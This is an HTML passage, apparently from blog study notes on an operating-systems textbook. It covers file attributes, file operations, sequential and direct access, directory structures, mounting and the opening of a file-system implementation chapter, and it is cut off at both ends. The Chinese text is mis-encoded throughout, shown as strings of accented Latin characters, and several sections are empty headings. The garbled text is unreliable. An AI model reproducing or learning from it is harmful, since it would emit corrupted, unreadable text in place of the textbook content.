‡å½¢å¼ï¼‰å’Œæ•°æ®ã€‚</p><h3 id="1011-æ–‡ä»¶å±æ€§"><a class="markdownIt-Anchor" href="#1011-æ–‡ä»¶å±æ€§"></a> 10.1.1 æ–‡ä»¶å±æ€§</h3><p>æ–‡ä»¶æœ‰ä¸€å®šçš„å±æ€§ï¼Œ è¿™æ ¹æ®ç³»ç»Ÿè€Œæœ‰æ‰€ä¸åŒï¼Œ ä½†æ˜¯é€šå¸¸éƒ½åŒ…æ‹¬å¦‚ä¸‹å±æ€§ï¼š</p><ul><li>åç§°ï¼šæ–‡ä»¶ç¬¦å·åç§°æ˜¯å”¯ä¸€çš„ã€ æŒ‰ç…§äººä»¬å®¹æ˜“è¯»å–çš„å½¢å¼ ä¿å­˜ã€‚</li><li>æ ‡è¯†ç¬¦ï¼šæ ‡è¯†æ–‡ä»¶ç³»ç»Ÿå†…æ–‡ä»¶çš„ å”¯ä¸€æ ‡ç­¾ï¼Œ é€šå¸¸ä¸ºæ•°å­—ï¼›å¯¹äººè€Œè¨€è¿™æ˜¯ä¸å¯è¯»çš„æ–‡ä»¶åç§°ã€‚</li><li>ç±»å‹ï¼šè¢«æ”¯æŒä¸åŒç±»å‹çš„æ–‡ä»¶ç³»ç»Ÿæ‰€ä½¿ç”¨ã€‚</li><li>ä½ç½®ï¼š è¯¥ä¿¡æ¯ä¸ºæŒ‡å‘è®¾å¤‡å’Œè®¾å¤‡ä¸Šæ–‡ä»¶ä½ç½®çš„æŒ‡é’ˆã€‚</li><li>å¤§å°ï¼šæ–‡ä»¶å½“å‰å¤§å°ï¼ˆä»¥å­—èŠ‚ã€å­—æˆ–å—æ¥ç»Ÿè®¡ã€‰ï¼Œè¯¥å±æ€§ä¹Ÿå¯åŒ…æ‹¬æ–‡ä»¶å…è®¸çš„æœ€å¤§å®¹é‡å€¼ã€‚</li><li>ä¿æŠ¤ï¼š å†³å®šè°èƒ½è¯»ã€å†™ã€ æ‰§è¡Œç­‰çš„è®¿é—®æ§åˆ¶ä¿¡æ¯ã€‚</li><li>æ—¶é—´ã€ æ—¥æœŸå’Œç”¨æˆ·æ ‡è¯†ï¼šæ–‡ä»¶åˆ›å»ºã€ ä¸Šæ¬¡ä¿®æ”¹å’Œä¸Šæ¬¡è®¿é—®çš„ç›¸å…³ä¿¡æ¯ã€‚ è¿™äº›æ•°æ®ç”¨äºä¿æŠ¤ã€ å®‰å…¨å’Œä½¿ç”¨è·Ÿè¸ªã€‚</li></ul><h3 id="1012-æ–‡ä»¶æ“ä½œ"><a class="markdownIt-Anchor" href="#1012-æ–‡ä»¶æ“ä½œ"></a> 10.1.2 æ–‡ä»¶æ“ä½œ</h3><p><strong>åŸºæœ¬æ–‡ä»¶æ“ä½œï¼š</strong></p><ul><li><p><strong>åˆ›å»ºæ–‡ä»¶</strong>ï¼šåˆ›å»ºæ–‡ä»¶æœ‰ä¸¤ä¸ªå¿…è¦æ­¥éª¤ã€‚ç¬¬ä¸€ï¼Œå¿…é¡»åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ä¸ºæ–‡ä»¶æ‰¾åˆ°ç©ºé—´ã€‚åœ¨ç¬¬11ç« ä¸­å°†ä¼šè®¨è®ºå¦‚ä½•ä¸º æ–‡ä»¶åˆ†é…ç©ºé—´ã€‚ ç¬¬äºŒï¼Œåœ¨ç›®å½•ä¸­ä¸º æ–°æ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ¡ç›®ã€‚</p></li><li><p><strong>å†™æ–‡ä»¶</strong>ï¼š ä¸ºäº†å†™æ–‡ä»¶ï¼Œæ‰§è¡Œä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå…¶æŒ‡æ˜æ–‡ä»¶åç§°å’Œè¦å†™å…¥æ–‡ä»¶çš„å†…å®¹ã€‚å¯¹äºç»™å®šçš„æ–‡ä»¶åç§°ï¼Œç³»ç»Ÿä¼šæœç´¢ç›®å½•ä»¥æŸ¥æ‰¾è¯¥æ–‡ä»¶ä½ç½®ã€‚ ç³»ç»Ÿå¿…é¡»ä¸ºè¯¥æ–‡ä»¶ç»´æŠ¤ä¸€ä¸ªå†›ä½ç½®çš„æŒ‡é’ˆã€‚æ¯å½“å‘ç”Ÿå†™æ“ä½œæ—¶ï¼Œå¿…é¡»æ›´æ–°å†™æŒ‡é’ˆã€‚</p></li><li><p><strong>è¯»æ–‡ä»¶</strong>ï¼š ä¸ºäº†è¯»æ–‡ä»¶ï¼Œä½¿ç”¨ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå¹¶æŒ‡æ˜æ–‡ä»¶åç§°å’Œè¦è¯»å…¥æ–‡ä»¶å—çš„å†…å­˜ä½ç½®ã€‚ åŒæ ·ï¼Œéœ€è¦æœç´¢ç›®å½•ä»¥æ‰¾åˆ°ç›¸å…³ç›®å½•é¡¹ï¼Œç³»ç»Ÿè¦ä¸ºè¯¥æ–‡ä»¶ç»´æŠ¤ä¸€ä¸ªè¯»ä½ç½®çš„æŒ‡é’ˆã€‚æ¯å½“å‘ç”Ÿè¯»æ“ä½œæ—¶ï¼Œå¿…é¡»æ›´æ–°å°‰æ—¨é’ˆã€‚ ä¸€ä¸ªè¿›ç¨‹é€šå¸¸åªå¯¹ä¸€ä¸ªæ–‡ä»¶è¯»æˆ–å†™ï¼Œæ‰€ä»¥å½“å‰æ“ä½œä½ç½®å¯ä½œä¸ºæ¯ä¸ªè¿›ç¨‹å½“å‰æ–‡ä»¶ä½ç½®æŒ‡é’ˆã€‚ç”±äº è¯»å’Œå†™æ“ä½œéƒ½ä½¿ç”¨åŒä¸€æŒ‡é’ˆï¼Œè¿™æ—¢èŠ‚çœäº†ç©ºé—´ä¹Ÿé™ä½ç³»ç»Ÿå¤æ‚åº¦ã€‚</p></li><li><p><strong>åœ¨æ–‡ä»¶å†…é‡å®šä½</strong>ï¼š æœç´¢ç›®å½•ç›¸åº”æ¡ç›®ï¼Œè®¾ç½®å½“å‰æ–‡ä»¶ä½ç½®æŒ‡é’ˆä¸ºç»™å®šå€¼ã€‚ åœ¨æ–‡ä»¶å†…é‡å®šä½ä¸éœ€è¦åŒ…å«çœŸæ­£çš„ I/0ã€‚è¯¥æ–‡ä»¶æ“ä½œä¹Ÿç§°ä¸ºä¸»ä½¯ç½©åœ¨ä¸–ï¼ˆseekï¼‰ã€‚</p></li><li><p><strong>åˆ é™¤æ–‡ä»¶</strong>ï¼š ä¸ºäº†åˆ é™¤æ–‡ä»¶ï¼Œåœ¨ç›®å½•ä¸­æœç´¢ç»™å®šåç§°çš„æ–‡ä»¶ã€‚ æ‰¾åˆ°ç›¸å…³ç›®å½•æ¡ç›®åï¼Œé‡Šæ”¾æ‰€æœ‰çš„æ–‡ä»¶ç©ºé—´ä»¥ä¾¿å…¶ä»–æ–‡ä»¶ä½¿ç”¨ï¼Œå¹¶åˆ é™¤ç›¸åº”ç›®å½•æ¡ç›®ã€‚</p></li><li><p><strong>æˆªçŸ­æ–‡ä»¶</strong>ï¼š ç”¨æˆ·å¯èƒ½åªéœ€è¦åˆ é™¤æ–‡ä»¶å†…å®¹è€Œä¿ç•™å…¶å±æ€§ï¼Œè€Œä¸æ˜¯å¼ºåˆ¶åˆ é™¤æ–‡ä»¶å†åˆ›å»ºæ–‡ä»¶ã€‚è¯¥å‡½æ•°å°†ä¸æ”¹å˜æ‰€æœ‰æ–‡ä»¶å±æ€§ï¼Œè€Œåªæ˜¯å°†å…¶é•¿åº¦è®¾ä¸º0å¹¶é‡Šæ”¾å…¶ç©ºé—´ã€‚</p></li></ul><h3 id="1013-æ–‡ä»¶ç±»å‹"><a class="markdownIt-Anchor" href="#1013-æ–‡ä»¶ç±»å‹"></a> 10.1.3 æ–‡ä»¶ç±»å‹</h3><p><img src="/posts/8ce3e425/image-20220108122633760.png" alt="image-20220108122633760"></p><h3 id="1014-æ–‡ä»¶ç»“æ„"><a class="markdownIt-Anchor" href="#1014-æ–‡ä»¶ç»“æ„"></a> 10.1.4 æ–‡ä»¶ç»“æ„</h3><h3 id="1015-å†…éƒ¨æ–‡ä»¶ç»“æ„"><a class="markdownIt-Anchor" href="#1015-å†…éƒ¨æ–‡ä»¶ç»“æ„"></a> 10.1.5 å†…éƒ¨æ–‡ä»¶ç»“æ„</h3><h2 id="102-è®¿é—®æ–¹æ³•"><a class="markdownIt-Anchor" href="#102-è®¿é—®æ–¹æ³•"></a> 10.2 è®¿é—®æ–¹æ³•</h2><h3 id="1021-é¡ºåºè®¿é—®"><a class="markdownIt-Anchor" href="#1021-é¡ºåºè®¿é—®"></a> 10.2.1 é¡ºåºè®¿é—®</h3><p>æœ€ä¸ºç®€å•çš„è®¿é—®æ–¹å¼æ˜¯<strong>é¡ºåºè®¿é—®</strong>ã€‚ æ–‡ä»¶ä¿¡æ¯æŒ‰é¡ºåºï¼Œ ä¸€ä¸ªè®°å½•æ¥ç€ä¸€ä¸ªè®°å½•åœ°åŠ ä»¥å¤„ç†ã€‚ è¿™ç§è®¿é—®æ¨¡å¼æœ€ä¸ºå¸¸ç”¨ï¼Œ ä¾‹å¦‚ï¼Œ ç¼–è¾‘å™¨å’Œç¼–è¯‘å™¨é€šå¸¸æŒ‰è¿™ç§æ–¹å¼è®¿é—®æ–‡ä»¶ã€‚</p><p>å¤§é‡çš„æ–‡ä»¶æ“ä½œæ˜¯è¯»å’Œå†™ã€‚ è¯»æ“ä½œè¯»å–ä¸‹ ä¸€æ–‡ä»¶éƒ¨åˆ†ï¼Œå¹¶è‡ªåŠ¨å‰ç§»æ–‡ä»¶æŒ‡é’ˆï¼Œä»¥è·Ÿè¸ªI/Oä½ç½®ã€‚ç±»ä¼¼åœ°ï¼Œ å†™æ“ä½œä¼šå‘æ–‡ä»¶å°¾éƒ¨å¢åŠ å†…å®¹ï¼Œç›¸åº”çš„æ–‡ä»¶æŒ‡é’ˆç§»åˆ°æ–°å¢æ•°æ®ä¹‹åï¼ˆ æ–°æ–‡ä»¶ç»“å°¾ï¼‰ã€‚ æ–‡ä»¶ä¹Ÿå¯é‡æ–°è®¾ç½®åˆ°å¼€å§‹ä½ç½®ï¼Œ æœ‰çš„ç³»ç»Ÿå…è®¸å‘å‰æˆ–å‘åè·³è¿‡nä¸ªï¼ˆè¿™é‡Œnä¸ºæ•´æ•°ï¼Œ æœ‰æ—¶åªèƒ½ä¸ºI)è®°å½•ã€‚ é¡ºåºè®¿é—®å¦‚å›¾ 10.3 æ‰€ç¤ºã€‚ é¡ºåºè®¿é—®åŸºäºæ–‡ä»¶çš„ç£å¸¦æ¨¡å‹ï¼Œä¸ä»…é€‚ç”¨äºé¡ºåºè®¿é—®è®¾å¤‡ï¼Œ ä¹Ÿé€‚ç”¨äºéšæœºè®¿é—®è®¾å¤‡ã€‚</p><p><img src="/posts/8ce3e425/image-20220108123600713.png" alt="image-20220108123600713"></p><h3 id="1022-ç›´æ¥è®¿é—®"><a class="markdownIt-Anchor" href="#1022-ç›´æ¥è®¿é—®"></a> 10.2.2 ç›´æ¥è®¿é—®</h3><p>å¦ä¸€æ–¹å¼æ˜¯<strong>ç›´æ¥è®¿é—®</strong> ï¼ˆæˆ–ç›¸å¯¹è®¿é—®ã€‰ã€‚ æ–‡ä»¶ç”±å›ºå®šé•¿åº¦çš„é€»è¾‘è®°å½•ç»„æˆï¼Œ ä»¥å…è®¸ç¨‹åºæŒ‰ä»»æ„é¡ºåºè¿›è¡Œå¿«é€Ÿè¯»å’Œå†™ã€‚ ç›´æ¥è®¿é—®æ–¹å¼æ˜¯åŸºäºæ–‡ä»¶çš„ç£ç›˜æ¨¡å‹ï¼Œ è¿™æ˜¯å› ä¸ºç£ç›˜å…è®¸å¯¹ä»»æ„æ–‡ä»¶å—è¿›è¡Œéšæœºè¯»å’Œå†™ã€‚ å¯¹ç›´æ¥è®¿é—®ï¼Œ æ–‡ä»¶å¯ä½œä¸ºå—æˆ–è®°å½•çš„ç¼–å·åºåˆ—ã€‚ å› æ­¤ï¼Œ å¯å…ˆè¯»å–å—14ï¼Œ å†è¯»å—53ï¼Œ æœ€åå†å†™å—7ã€‚ å¯¹äºç›´æ¥è®¿é—®æ–‡ä»¶ï¼Œ è¯»å†™é¡ºåºæ˜¯æ²¡æœ‰é™åˆ¶çš„ã€‚</p><p>ç”±ç”¨æˆ·å‘æ“ä½œç³»ç»Ÿæ‰€æä¾›çš„å—å·é€šå¸¸ä¸º<strong>ç›¸å¯¹å—å·</strong>ã€‚ ç›¸å¯¹å—å·æ˜¯ç›¸å¯¹äºæ–‡ä»¶å¼€å§‹çš„ç´¢å¼•ã€‚</p><h3 id="1023-å…¶ä»–è®¿é—®æ–¹å¼"><a class="markdownIt-Anchor" href="#1023-å…¶ä»–è®¿é—®æ–¹å¼"></a> 10.2.3 å…¶ä»–è®¿é—®æ–¹å¼</h3><p>å…¶ä»–è®¿é—®æ–¹å¼å¯å»ºç«‹åœ¨ç›´æ¥è®¿é—®æ–¹å¼ä¹‹ä¸Šã€‚ è¿™äº›è®¿é—®é€šå¸¸æ¶‰åŠåˆ›å»ºæ–‡ä»¶ç´¢å¼•ã€‚ ç´¢å¼•åŒ…æ‹¬å„å—çš„æŒ‡é’ˆã€‚ ä¸ºäº†æŸ¥æ‰¾æ–‡ä»¶ä¸­çš„è®°å½•ï¼Œ é¦–å…ˆæœç´¢ç´¢å¼•ï¼Œ å†æ ¹æ®æŒ‡é’ˆç›´æ¥è®¿é—®æ–‡ä»¶ï¼Œ ä»¥æŸ¥æ‰¾æ‰€éœ€è¦çš„è®°å½•ã€‚</p><p><img src="/posts/8ce3e425/image-20220108124050544.png" alt="image-20220108124050544"></p><h2 id="103-ç›®å½•ç»“æ„"><a class="markdownIt-Anchor" href="#103-ç›®å½•ç»“æ„"></a> 10.3 ç›®å½•ç»“æ„</h2><h3 id="1031-å­˜å‚¨ç»“æ„"><a class="markdownIt-Anchor" href="#1031-å­˜å‚¨ç»“æ„"></a> 10.3.1 å­˜å‚¨ç»“æ„</h3><p>æœ‰æ—¶éœ€è¦åœ¨ä¸€ä¸ªç£ç›˜ä¸Šè£…å¤šç§æ–‡ä»¶ç³»ç»Ÿï¼Œ æˆ–ä¸€éƒ¨åˆ†ç”¨äºæ–‡ä»¶ç³»ç»Ÿè€Œå¦ ä¸€éƒ¨åˆ†ç”¨äºå…¶ä»–åœ°æ–¹ï¼Œ å¦‚äº¤æ¢ç©ºé—´æˆ–éæ ¼å¼åŒ–çš„ç£ç›˜ç©ºé—´ã€‚ è¿™äº›éƒ¨åˆ†ç§°ä¸º<strong>åˆ†åŒº</strong>æˆ–ç‰‡ï¼Œ æˆ–ç§°ä¸ºå°å‹ç£ç›˜ï¼ˆIBMçš„è¯´æ³•ï¼‰ã€‚</p><p>å°†å­˜å‚¨æ–‡ä»¶ç³»ç»Ÿçš„ä¸€å¤§å—å­˜å‚¨ç©ºé—´ä½œä¸º<strong>å·</strong>ã€‚ å·å¯ä»¥å­˜æ”¾å¤šä¸ªæ“ä½œç³»ç»Ÿï¼Œ ä½¿ç³»ç»Ÿå¯åŠ¨å’Œè¿è¡Œå¤šä¸ªæ“ä½œç³»ç»Ÿã€‚</p><p><img src="/posts/8ce3e425/image-20220108124227507.png" alt="image-20220108124227507"></p><h3 id="1032-ç›®å½•æ¦‚è¿°"><a class="markdownIt-Anchor" href="#1032-ç›®å½•æ¦‚è¿°"></a> 10.3.2 ç›®å½•æ¦‚è¿°</h3><p><strong>ç›®å½•ç›¸å…³æ“ä½œï¼š</strong></p><ul><li>**æœç´¢æ–‡ä»¶ï¼š**éœ€è¦èƒ½å¤Ÿæœç´¢ç›®å½•ç»“æ„ä»¥æŸ¥æ‰¾ç‰¹å®šæ–‡ä»¶çš„æ¡ç›®ã€‚å› ä¸ºæ–‡ä»¶å…·æœ‰ç¬¦å·åç§°ï¼Œä¸”ç±»ä¼¼çš„åç§°å¯èƒ½è¡¨ç¤ºæ–‡ä»¶ä¹‹é—´çš„å…³ç³»ï¼Œ æ‰€ä»¥è¦èƒ½æŸ¥æ‰¾æ–‡ä»¶åå’ŒæŸä¸ªæ¨¡å¼ç›¸åŒ¹é…çš„æ‰€æœ‰æ–‡ä»¶ã€‚</li><li><strong>åˆ›å»ºæ–‡ä»¶ï¼š</strong> å¯ä»¥åˆ›å»ºæ–°æ–‡ä»¶å¹¶å¢åŠ åˆ°ç›®å½•ä¸­ã€‚</li><li><strong>åˆ é™¤æ–‡ä»¶ï¼š</strong> å½“ä¸å†éœ€è¦æ–‡ä»¶æ—¶ï¼Œ å¯ä»¥ä»ç›®å½•ä¸­åˆ é™¤å®ƒã€‚</li><li><strong>éå†ç›®å½•ï¼š</strong> éœ€è¦èƒ½éå†ç›®å½•å†…çš„æ‰€æœ‰æ–‡ä»¶ä»¥åŠå…¶ç›®å½•ä¸­æ¯ä¸ªæ–‡ä»¶æ¡ç›®çš„å†…å®¹ã€‚</li><li><strong>é‡å‘½åæ–‡ä»¶ï¼š</strong> å› ä¸ºæ–‡ä»¶åç§°å¯å‘ç”¨æˆ·è¡¨ç¤ºå…¶å†…å®¹ï¼Œ å½“æ–‡ä»¶å†…å®¹å’Œç”¨é€”æ”¹å˜æ—¶åç§°å¿…é¡»æ”¹å˜ã€‚ é‡æ–°å‘½åæ–‡ä»¶ä¹Ÿå…è®¸æ”¹å˜è¯¥æ–‡ä»¶åœ¨ç›®å½•ç»“æ„ä¸­çš„ä½ç½®ã€‚</li><li><strong>è·Ÿè¸ªæ–‡ä»¶ç³»ç»Ÿï¼š</strong> ç”¨æˆ·å¯èƒ½å¸Œæœ›è®¿é—®æ¯ä¸ªç›®å½•å’Œæ¯ä¸ªç›®å½•çš„æ¯ä¸ªæ–‡ä»¶ã€‚ ä¸ºäº†å¯é ï¼Œ å®šæœŸå¤‡ä»½æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„å†…å®¹å’Œç»“æ„æ˜¯ä¸ªä¸é”™çš„æ–¹æ³•ã€‚ è¿™ç§å¤‡ä»½é€šå¸¸å°†æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ°ç£å¸¦ä¸Šã€‚ è¿™ç§æŠ€æœ¯æä¾›äº†å¤‡ä»½å‰¯æœ¬ä»¥é˜²æ­¢ç³»ç»Ÿå‡ºé”™ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œ å½“æ–‡ä»¶ä¸å†ä½¿ç”¨æ—¶å€™ï¼Œ è¿™ä¸ªæ–‡ä»¶è¢«å¤åˆ¶åˆ°ç£å¸¦ä¸Šï¼Œ è¯¥æ–‡ä»¶çš„åŸæ¥å ç”¨ç£ç›˜ç©ºé—´å¯ä»¥é‡Šæ”¾ä»¥ä¾›å…¶ä»–æ–‡ä»¶æ‰€ç”¨ã€‚</li></ul><h3 id="1033-å•å±‚ç»“æ„ç›®å½•"><a class="markdownIt-Anchor" href="#1033-å•å±‚ç»“æ„ç›®å½•"></a> 10.3.3 å•å±‚ç»“æ„ç›®å½•</h3><p>æœ€ç®€å•çš„ç›®å½•ç»“æ„æ˜¯å•å±‚ç»“æ„ç›®å½•ã€‚ æ‰€æœ‰æ–‡ä»¶éƒ½åŒ…å«åœ¨åŒä¸€ç›®å½•ä¸­ï¼Œ å…¶ç‰¹ç‚¹æ˜¯ä¾¿äºç†è§£å’Œæ”¯æŒã€‚</p><p><img src="/posts/8ce3e425/image-20220108125045812.png" alt="image-20220108125045812"></p><h3 id="1034-åŒå±‚ç»“æ„ç›®å½•"><a class="markdownIt-Anchor" href="#1034-åŒå±‚ç»“æ„ç›®å½•"></a> 10.3.4 åŒå±‚ç»“æ„ç›®å½•</h3><p>å¯¹äº<strong>åŒå±‚ç»“æ„ç›®å½•</strong>çš„ç»“æ„ï¼Œ æ¯ä¸ªç”¨æˆ·éƒ½æœ‰è‡ªå·±çš„ç”¨æˆ·æ–‡ä»¶ç›®å½•ï¼ˆ user file directory,UFDï¼‰ã€‚ æ¯ä¸ªUFD éƒ½æœ‰ç›¸ä¼¼çš„ç»“æ„ï¼Œ ä½†åªåˆ—å‡ºäº†å•ä¸ªç”¨æˆ·çš„æ–‡ä»¶ã€‚ å½“ä¸€ä¸ªç”¨æˆ·ä½œä¸šå¼€å§‹æ‰§è¡Œæˆ–ä¸€ä¸ªç”¨æˆ·æ³¨å†Œæ—¶ï¼Œ å°±æœç´¢ç³»ç»Ÿçš„ä¸»æ–‡ä»¶ç›®å½•ï¼ˆ master file directory, MFDï¼‰ã€‚ é€šè¿‡ç”¨æˆ·åæˆ–è´¦å·å¯ç´¢å¼•MFDï¼Œ æ¯ä¸ªæ¡ç›®æŒ‡å‘ç”¨æˆ·çš„UFDï¼ˆè§å›¾10.8ï¼‰ã€‚</p><p><img src="/posts/8ce3e425/image-20220108125126077.png" alt="image-20220108125126077"></p><p>è™½ç„¶åŒå±‚ç»“æ„ç›®å½•è§£å†³äº†åç§°å†²çªé—®é¢˜ï¼Œ ä½†æ˜¯å®ƒä»æœ‰ç¼ºç‚¹ã€‚ è¿™ç§ç»“æ„æœ‰æ•ˆåœ°å¯¹ç”¨æˆ·åŠ ä»¥éš”ç¦»ã€‚ è¿™ç§éš”ç¦»åœ¨ç”¨æˆ·éœ€è¦å®Œå…¨ç‹¬ç«‹æ—¶æ˜¯ä¼˜ç‚¹ï¼Œ ä½†æ˜¯åœ¨ç”¨æˆ·éœ€è¦åœ¨æŸä¸ªä»»åŠ¡ä¸Šè¿›è¡Œåˆä½œå’Œè®¿é—®å…¶ä»–æ–‡ä»¶æ—¶å´æ˜¯ä¸ªç¼ºç‚¹ã€‚ æœ‰çš„ç³»ç»Ÿç®€å•åœ°ä¸å…è®¸æœ¬åœ°ç”¨æˆ·æ–‡ä»¶è¢«å…¶ä»–ç”¨æˆ·æ‰€è®¿é—®ã€‚</p><h3 id="1035-æ ‘çŠ¶ç»“æ„ç›®å½•"><a class="markdownIt-Anchor" href="#1035-æ ‘çŠ¶ç»“æ„ç›®å½•"></a> 10.3.5 æ ‘çŠ¶ç»“æ„ç›®å½•</h3><p>å°†ä¸¤å±‚ç›®å½•ç»“æ„æ‰©å±•ä¸ºä»»æ„é«˜åº¦çš„æ ‘ï¼Œè¿™ç§æ¨å¹¿å…è®¸ç”¨æˆ·åˆ›å»ºè‡ªå·±çš„å­ç›®å½•ï¼Œç›¸åº”åœ°ç»„ç»‡æ–‡ä»¶ã€‚äº‹å®ä¸Šï¼Œæ ‘æ˜¯æœ€ä¸ºå¸¸ç”¨çš„ç›®å½•ç»“æ„ã€‚æ ‘æœ‰æ ¹ç›®å½•ï¼Œç³»ç»Ÿå†…çš„æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰å”¯ä¸€è·¯å¾„åã€‚</p><p><img src="/posts/8ce3e425/image-20220108125717434.png" alt="image-20220108125717434"></p><h3 id="1036-æ— ç¯å›¾ç›®å½•"><a class="markdownIt-Anchor" href="#1036-æ— ç¯å›¾ç›®å½•"></a> 10.3.6 æ— ç¯å›¾ç›®å½•</h3><p>æ ‘çŠ¶ç»“æ„ç¦æ­¢å…±äº«æ–‡ä»¶å’Œç›®å½•ã€‚ <strong>æ— ç¯å›¾</strong>ï¼ˆacyclic graphï¼‰å…è®¸ç›®å½•å«æœ‰å…±äº«å­ç›®å½•å’Œæ–‡ä»¶ï¼ˆè§å›¾10.10ï¼‰ã€‚ ç”¨ä¸€æ–‡ä»¶æˆ–å­ç›®å½•å¯å‡ºç°åœ¨ä¸¤ä¸ªä¸åŒç›®å½•ä¸­ã€‚ æ— ç¯å›¾æ˜¯æ ‘çŠ¶ç»“æ„ç›®å½•æ–¹æ¡ˆçš„æ‰©å±•ã€‚</p><p><img src="/posts/8ce3e425/image-20220108130216854.png" alt="image-20220108130216854"></p><h3 id="1037-é€šç”¨å›¾ç›®å½•"><a class="markdownIt-Anchor" href="#1037-é€šç”¨å›¾ç›®å½•"></a> 10.3.7 é€šç”¨å›¾ç›®å½•</h3><p>å½“å¯¹å·±å­˜åœ¨çš„æ ‘çŠ¶ç»“æ„ç›®å½•å¢åŠ é“¾æ¥æ—¶ï¼Œ æ ‘çŠ¶ç»“æ„å°±è¢«ç ´åäº†ï¼Œ äº§ç”Ÿäº†ç®€å•çš„å›¾ç»“æ„  ã€‚</p><p><img src="/posts/8ce3e425/image-20220108130627493.png" alt="image-20220108130627493"></p><h2 id="104-æ–‡ä»¶ç³»ç»Ÿå®‰è£…"><a class="markdownIt-Anchor" href="#104-æ–‡ä»¶ç³»ç»Ÿå®‰è£…"></a> 10.4 æ–‡ä»¶ç³»ç»Ÿå®‰è£…</h2><p>å¦‚åŒæ–‡ä»¶ä½¿ç”¨å‰å¿…é¡»è¦æ‰©å¼€ï¼Œæ–‡ä»¶ç³»ç»Ÿåœ¨è¢«ç³»ç»Ÿä¸Šçš„è¿›ç¨‹ä½¿ç”¨ä¹‹å‰å¿…é¡»å®‰è£…ï¼ˆ mountï¼‰ã€‚å…·ä½“åœ°è¯´ï¼Œ ç›®å½•ç»“æ„å¯ä»¥å»ºç«‹åœ¨å¤šä¸ªå·ä¸Šï¼Œ è¿™äº›å·å¿…é¡»è¢«å®‰è£…ä»¥ä½¿å®ƒä»¬åœ¨æ–‡ä»¶ç³»ç»Ÿå‘½åç©ºé—´ä¸­å¯ç”¨ã€‚</p><p><img src="/posts/8ce3e425/image-20220108131017823.png" alt="image-20220108131017823"></p><h2 id="105-æ–‡ä»¶å…±äº«"><a class="markdownIt-Anchor" href="#105-æ–‡ä»¶å…±äº«"></a> 10.5 æ–‡ä»¶å…±äº«</h2><h3 id="1051-å¤šç”¨æˆ·"><a class="markdownIt-Anchor" href="#1051-å¤šç”¨æˆ·"></a> 10.5.1 å¤šç”¨æˆ·</h3><h3 id="1052-è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#1052-è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿ"></a> 10.5.2 è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿ</h3><h3 id="1053-ä¸€è‡´æ€§è¯­ä¹‰"><a class="markdownIt-Anchor" href="#1053-ä¸€è‡´æ€§è¯­ä¹‰"></a> 10.5.3 ä¸€è‡´æ€§è¯­ä¹‰</h3><h2 id="106-ä¿æŠ¤"><a class="markdownIt-Anchor" href="#106-ä¿æŠ¤"></a> 10.6 ä¿æŠ¤</h2><h3 id="1061-è®¿å›ç±»å‹"><a class="markdownIt-Anchor" href="#1061-è®¿å›ç±»å‹"></a> 10.6.1 è®¿å›ç±»å‹</h3><h3 id="1062-è®¿é—®æ§åˆ¶"><a class="markdownIt-Anchor" href="#1062-è®¿é—®æ§åˆ¶"></a> 10.6.2 è®¿é—®æ§åˆ¶</h3><h3 id="1063-å…¶ä»–ä¿æŠ¤æ–¹å¼"><a class="markdownIt-Anchor" href="#1063-å…¶ä»–ä¿æŠ¤æ–¹å¼"></a> 10.6.3 å…¶ä»–ä¿æŠ¤æ–¹å¼</h3><h2 id="107-å°ç»“"><a class="markdownIt-Anchor" href="#107-å°ç»“"></a> 10.7 å°ç»“</h2><h2 id="ä¹ é¢˜"><a class="markdownIt-Anchor" href="#ä¹ é¢˜"></a> ä¹ é¢˜</h2><h1 id="ç¬¬11ç« -æ–‡ä»¶ç³»ç»Ÿå®ç°"><a class="markdownIt-Anchor" href="#ç¬¬11ç« -æ–‡ä»¶ç³»ç»Ÿå®ç°"></a> ç¬¬11ç«  æ–‡ä»¶ç³»ç»Ÿå®ç°</h1><h2 id="111-æ–‡ä»¶ç³»ç»Ÿç»“æ„"><a class="markdownIt-Anchor" href="#111-æ–‡ä»¶ç³»ç»Ÿç»“æ„"></a> 11.1 æ–‡ä»¶ç³»ç»Ÿç»“æ„</h2><p>ç£ç›˜æä¾›å¤§é‡çš„å¤–å­˜ç©ºé—´æ¥ç»´æŒæ–‡ä»¶ç³»ç»Ÿã€‚<strong>ç£ç›˜</strong>çš„ä¸‹è¿°ä¸¤ä¸ª<strong>ç‰¹ç‚¹</strong>ï¼Œä½¿å…¶æˆä¸ºå­˜å‚¨å¤šä¸ªæ–‡ä»¶çš„æ–¹ä¾¿ä»‹è´¨ï¼š</p><ul><li><p>â‘ å¯ä»¥åŸåœ°é‡å†™ï¼Œå¯ä»¥ä»ç£ç›˜ä¸Šè¯»ä¸€å—ï¼Œä¿®æ”¹è¯¥å—ï¼Œå¹¶å°†å®ƒå†™å›åˆ°åŸæ¥çš„ä½ç½®ã€‚</p></li><li><p>â‘¡å¯ä»¥ç›´æ¥è®¿é—®ç£ç›˜ä¸Šçš„ä»»æ„ä¸€å—ä¿¡æ¯ã€‚å› æ­¤ï¼Œå¯ä»¥æ–¹ä¾¿åœ°æŒ‰é¡ºåºæˆ–éšæœºåœ°è®¿é—®æ–‡ä»¶ï¼Œä»ä¸€ä¸ªæ–‡ä»¶åˆ‡æ¢åˆ°å¦ ä¸€ä¸ªæ–‡ä»¶åªéœ€è¦ç®€å•åœ°ç§»åŠ¨è¯»å†™ç£å¤´å¹¶ç­‰å¾…ç£ç›˜è½¬åŠ¨å³å¯ä»¥å®Œæˆã€‚</p></li></ul><p><img src="/posts/8ce3e425/image-20220108133306308.png" alt="image-20220108133306308"></p><p>è®¾è®¡ä¸­çš„æ¯å±‚åˆ©ç”¨è¾ƒä½å±‚çš„åŠŸèƒ½åˆ›å»ºæ–°çš„åŠŸèƒ½æ¥ä¸ºæ›´é«˜å±‚æœåŠ¡ã€‚</p><p><strong>I/Oæ§åˆ¶</strong>ä¸ºæœ€åº•å±‚ï¼Œ ç”±è®¾å¤‡é©±åŠ¨ç¨‹åºå’Œä¸­æ–­å¤„ç†ç¨‹åºç»„æˆï¼Œ å®ç°å†…å­˜ä¸ 